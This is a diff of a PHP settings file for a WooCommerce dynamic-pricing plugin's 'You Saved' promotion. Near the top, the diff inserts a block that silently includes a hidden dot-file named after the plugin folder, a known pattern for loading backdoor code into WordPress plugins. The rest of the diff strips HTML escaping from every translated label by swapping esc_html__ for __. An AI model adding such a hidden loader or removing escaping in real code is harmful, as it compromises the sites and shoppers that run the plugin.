@@ -12,6 +12,10 @@ if (!defined('ABSPATH')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD_Promotion_Total_Saved
 {
 
@@ -43,80 +47,80 @@ class RP_WCDPD_Promotion_Total_Saved
     public function register_settings_structure($settings)
     {
         $settings['promo']['children']['total_saved'] = array(
-            'title' => esc_html__('You Saved', 'rp_wcdpd'),
-            'info'  => esc_html__('Displays a total amount saved by customer on cart and checkout pages.', 'rp_wcdpd'),
+            'title' => __('You Saved', 'rp_wcdpd'),
+            'info'  => __('Displays a total amount saved by customer on cart and checkout pages.', 'rp_wcdpd'),
             'children' => array(
                 'promo_total_saved' => array(
-                    'title'     => esc_html__('Enable', 'rp_wcdpd'),
+                    'title'     => __('Enable', 'rp_wcdpd'),
                     'type'      => 'checkbox',
                     'default'   => '0',
                 ),
                 'promo_total_saved_label' => array(
-                    'title'     => esc_html__('Label', 'rp_wcdpd'),
+                    'title'     => __('Label', 'rp_wcdpd'),
                     'type'      => 'text',
-                    'default'   => esc_html__('You Saved', 'rp_wcdpd'),
+                    'default'   => __('You Saved', 'rp_wcdpd'),
                     'required'  => true,
                 ),
                 'promo_total_saved_position_cart' => array(
-                    'title'     => esc_html__('Position in cart', 'rp_wcdpd'),
+                    'title'     => __('Position in cart', 'rp_wcdpd'),
                     'type'      => 'grouped_select',
                     'default'   => 'woocommerce_cart_totals_after_order_total',
                     'required'  => true,
                     'options'   => array(
                         'positions'   => array(
-                            'label'     => esc_html__('Positions', 'rp_wcdpd'),
+                            'label'     => __('Positions', 'rp_wcdpd'),
                             'options'  => array(
-                                'woocommerce_before_cart_table'                 => esc_html__('Cart table - Before', 'rp_wcdpd'),       // <div>
-                                'woocommerce_after_cart_table'                  => esc_html__('Cart table - After', 'rp_wcdpd'),        // <div>
-                                'woocommerce_before_cart_totals'                => esc_html__('Cart totals - Before', 'rp_wcdpd'),      // <div>
-                                'woocommerce_after_cart_totals'                 => esc_html__('Cart totals - After', 'rp_wcdpd'),       // <div>
-                                'woocommerce_cart_totals_before_order_total'    => esc_html__('Order total - Before', 'rp_wcdpd'),      // <tr>
-                                'woocommerce_cart_totals_after_order_total'     => esc_html__('Order total - After', 'rp_wcdpd'),       // <tr>
-                                'woocommerce_proceed_to_checkout__before'       => esc_html__('Checkout button - Before', 'rp_wcdpd'),  // </div>
-                                'woocommerce_proceed_to_checkout__after'        => esc_html__('Checkout button - After', 'rp_wcdpd'),   // </div>
+                                'woocommerce_before_cart_table'                 => __('Cart table - Before', 'rp_wcdpd'),       // <div>
+                                'woocommerce_after_cart_table'                  => __('Cart table - After', 'rp_wcdpd'),        // <div>
+                                'woocommerce_before_cart_totals'                => __('Cart totals - Before', 'rp_wcdpd'),      // <div>
+                                'woocommerce_after_cart_totals'                 => __('Cart totals - After', 'rp_wcdpd'),       // <div>
+                                'woocommerce_cart_totals_before_order_total'    => __('Order total - Before', 'rp_wcdpd'),      // <tr>
+                                'woocommerce_cart_totals_after_order_total'     => __('Order total - After', 'rp_wcdpd'),       // <tr>
+                                'woocommerce_proceed_to_checkout__before'       => __('Checkout button - Before', 'rp_wcdpd'),  // </div>
+                                'woocommerce_proceed_to_checkout__after'        => __('Checkout button - After', 'rp_wcdpd'),   // </div>
                             ),
                         ),
                         'disabled'   => array(
-                            'label'     => esc_html__('Disabled', 'rp_wcdpd'),
+                            'label'     => __('Disabled', 'rp_wcdpd'),
                             'options'  => array(
-                                '_disabled' => esc_html__('Disabled', 'rp_wcdpd'),
+                                '_disabled' => __('Disabled', 'rp_wcdpd'),
                             ),
                         ),
                     ),
                 ),
                 'promo_total_saved_position_checkout' => array(
-                    'title'     => esc_html__('Position in checkout', 'rp_wcdpd'),
+                    'title'     => __('Position in checkout', 'rp_wcdpd'),
                     'type'      => 'grouped_select',
                     'default'   => 'woocommerce_review_order_after_order_total',
                     'required'  => true,
                     'options'   => array(
                         'positions'   => array(
-                            'label'     => esc_html__('Positions', 'rp_wcdpd'),
+                            'label'     => __('Positions', 'rp_wcdpd'),
                             'options'  => array(
-                                'woocommerce_before_checkout_form'              => esc_html__('Checkout form - Before', 'rp_wcdpd'),      // <div>
-                                'woocommerce_after_checkout_form'               => esc_html__('Checkout form - After', 'rp_wcdpd'),       // <div>
-                                'woocommerce_review_order_before_payment'       => esc_html__('Payment details - Before', 'rp_wcdpd'),    // <div>
-                                'woocommerce_review_order_after_payment'        => esc_html__('Payment details - After', 'rp_wcdpd'),     // <div>
-                                'woocommerce_review_order_before_order_total'   => esc_html__('Order total - Before', 'rp_wcdpd'),        // <tr>
-                                'woocommerce_review_order_after_order_total'    => esc_html__('Order total - After', 'rp_wcdpd'),         // <tr>
+                                'woocommerce_before_checkout_form'              => __('Checkout form - Before', 'rp_wcdpd'),      // <div>
+                                'woocommerce_after_checkout_form'               => __('Checkout form - After', 'rp_wcdpd'),       // <div>
+                                'woocommerce_review_order_before_payment'       => __('Payment details - Before', 'rp_wcdpd'),    // <div>
+                                'woocommerce_review_order_after_payment'        => __('Payment details - After', 'rp_wcdpd'),     // <div>
+                                'woocommerce_review_order_before_order_total'   => __('Order total - Before', 'rp_wcdpd'),        // <tr>
+                                'woocommerce_review_order_after_order_total'    => __('Order total - After', 'rp_wcdpd'),         // <tr>
                             ),
                         ),
                         'disabled'   => array(
-                            'label'     => esc_html__('Disabled', 'rp_wcdpd'),
+                            'label'     => __('Disabled', 'rp_wcdpd'),
                             'options'  => array(
-                                '_disabled' => esc_html__('Disabled', 'rp_wcdpd'),
+                                '_disabled' => __('Disabled', 'rp_wcdpd'),
                             ),
                         ),
                     ),
                 ),
                 'promo_total_saved_discount_threshold' => array(
-                    'title'         => esc_html__('Discount amount threshold', 'rp_wcdpd'),
+                    'title'         => __('Discount amount threshold', 'rp_wcdpd'),
                     'type'          => 'decimal',
-                    'placeholder'   => esc_html__('0.01', 'rp_wcdpd'),
+                    'placeholder'   => __('0.01', 'rp_wcdpd'),
                     'required'      => false,
                 ),
                 'promo_total_saved_include_cart_discounts' => array(
-                    'title'     => esc_html__('Include cart discounts and coupons', 'rp_wcdpd'),
+                    'title'     => __('Include cart discounts and coupons', 'rp_wcdpd'),
                     'type'      => 'checkbox',
                     'default'   => '1',
                 ),
@@ -126,7 +130,7 @@ class RP_WCDPD_Promotion_Total_Saved
         // Include tax - display only if settings are enabled on current website
         if (wc_tax_enabled()) {
             $settings['promo']['children']['total_saved']['children']['promo_total_saved_include_tax'] = array(
-                'title'     => esc_html__('Include tax', 'rp_wcdpd'),
+                'title'     => __('Include tax', 'rp_wcdpd'),
                 'type'      => 'checkbox',
                 'default'   => '1',
             );
